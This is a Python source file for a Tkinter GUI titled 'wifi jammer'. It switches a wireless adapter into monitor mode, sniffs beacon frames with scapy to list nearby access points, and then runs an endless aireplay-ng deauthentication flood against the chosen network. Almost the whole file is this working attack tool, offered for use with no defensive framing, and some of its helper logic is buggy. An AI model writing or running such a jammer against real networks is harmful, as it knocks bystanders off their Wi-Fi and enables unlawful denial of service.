import os
import time
import psutil
from tkinter import *
from tkinter import ttk
from tkinter import messagebox
from scapy.all import *
from threading import Thread


class app(object):
	def __init__(self):
		self.bg = "#081828"
		self.fg = "#FFFFFF"
		self.font = 16
		self.event = Event()
		self.adapter = None
		self.adapter_mon = None
		self.scanning = False
		self.monitor_mode = False
		self.channel_changer = Thread(target=self.change_channel)
		self.channel_changer.daemon = True
		self.adapters = list(psutil.net_if_addrs().keys())

		self.window()

	def get_adapter(self):
		self.root.withdraw()
		self.aw = Toplevel()
		self.aw.config(bg=self.bg)
		self.aw.title("select adapter")
		self.aw.geometry("400x550")
		self.aw.protocol("WM_DELETE_WINDOW", self.close_window)

		self.wireless_adapters = ttk.Treeview(self.aw, columns=0,show='', height=8)
		self.button_select = Button(self.aw,text="select",bg=self.bg,fg=self.fg,font=self.font,command=self.set_adapter)

		for i in range(len(self.adapters)):
			self.wireless_adapters.insert(parent='',index=i,iid=i,values=self.adapters[i])

		self.wireless_adapters.pack(fill=BOTH,expand=True,side=TOP)
		self.button_select.pack(fill=X,side=BOTTOM)
		self.aw.mainloop()

	def window(self):
		print(self.prompt)
		self.root = Tk()
		self.root.config(bg=self.bg)
		self.root.title("wifi jammer")
		self.root.geometry("400x550")

		self.style = ttk.Style()
		self.style.theme_use("default")
		self.style.configure("Treeview", background=self.bg,fieldbackground=self.bg, foreground="white",font=self.font)
		self.style.map("Treeview")

		self.widgets()
		self.get_adapter()
		self.root.mainloop()

	def widgets(self):
		self.devices = ttk.Treeview(self.root, columns=3, height=8)
		self.devices['columns']=('ESSID', 'BSSID','CHANNEL')
		self.devices.column('#0', width=0, stretch=NO)
		self.devices.column('ESSID', anchor=CENTER,width=100)
		self.devices.column('BSSID', anchor=CENTER,width=100)
		self.devices.column('CHANNEL', anchor=CENTER,width=10)
		self.devices.heading('#0', text='', anchor=CENTER)
		self.devices.heading('BSSID', text='BSSID(mac address)', anchor=CENTER)
		self.devices.heading('CHANNEL', text='CHANNEL', anchor=CENTER)
		self.devices.heading('ESSID', text='ESSID(name)', anchor=CENTER)

		self.button_scan = Button(self.root,text="start scan",bg=self.bg,fg=self.fg,font=self.font,
			command=lambda:Thread(target=self.scan).start())
		self.button_deauth = Button(self.root,text="deauth",bg=self.bg,fg=self.fg,font=self.font,
			command=lambda:Thread(target=self.deauth).start())

		self.devices.pack(fill=BOTH,expand=True,side=TOP)
		self.button_scan.pack(fill=BOTH,expand=True,side=LEFT)
		self.button_deauth.pack(fill=BOTH,expand=True,side=RIGHT)

	def set_adapter(self):
		adapter_no = self.wireless_adapters.focus()
		adapter = self.wireless_adapters.item(adapter_no,'values')
		if adapter:
			self.adapter = adapter[0]
			self.adapter_mon = self.adapter+'mon'
			self.enable_monitor_mode()
			self.root.deiconify()
			self.aw.destroy()
		else:
			messagebox.showwarning("error","please select a wireless_adapter")

	def close_window(self):
		if self.adapter is None:
			self.root.destroy()
		else:
			self.aw.destroy()

	def on_exit(self):
		if self.monitor_mode:
			self.disable_monitor_mode()
		self.root.destroy()

	def prompt(self):
		return 0

	def add_accesspoint(self,data):
		ssid = data[0]
		all_ssids = [self.devices.item(no,'values')[0] for no in self.devices.get_children()]
		if not len(all_ssids):
			self.devices.insert(parent='',index=0,iid=0,values=data)
			return

		if ssid in all_ssids:
			index = all_ssids.index(ssid)
			self.devices.delete(index)
			self.devices.insert(parent='',index=index,iid=index,values=data)
		else:
			index = len(all_ssids)
			self.devices.insert(parent='',index=index,iid=index,values=data)

	def enable_monitor_mode(self):
		self.monitor_mode = True
		os.system(f"sudo airmon-ng start {self.adapter}")

	def disable_monitor_mode(self):
		self.monitor_mode = True
		os.system(f"sudo airmon-ng stop {self.adapter_mon}")
		
	def scan(self):
		if not self.scanning:
			self.scanning = True
			self.button_scan.config(text="stop scan")
			self.channel_changer.start()
			sniff(prn=self.callback,iface=self.adapter_mon,stop_filter=lambda x:self.event.is_set())
		else:
			self.event.set()
			self.event = Event()
			self.scanning = False
			self.button_scan.config(text="start scan")

	def deauth(self):
		if self.scanning:
			self.scanning = False
		device = self.devices.focus()
		data = self.devices.item(device,'values')
		if data:
			ssid,bssid,channel = data
			os.system(f"sudo airmon-ng start {self.adapter_mon} {channel}")
			os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} {self.adapter_mon}")

	def callback(self,packet):
		if packet.haslayer(Dot11Beacon):
			bssid = packet[Dot11].addr2
			ssid = packet[Dot11Elt].info.decode()
			try:
				dbm_signal = packet.dBm_AntSignal
			except:
				dbm_signal = "N/A"
			stats = packet[Dot11Beacon].network_stats()
			channel = stats.get("channel")
			crypto = stats.get("crypto")
			print(bssid,ssid, dbm_signal, channel, crypto)
			data = (ssid,bssid,channel)
			self.add_accesspoint(data)
			time.sleep(2)

	def change_channel(self):
		ch = 1
		while self.scanning:
			os.system(f"iwconfig {self.adapter_mon} channel {ch}")
			ch = ch % 14 + 1
			time.sleep(0.5)



app()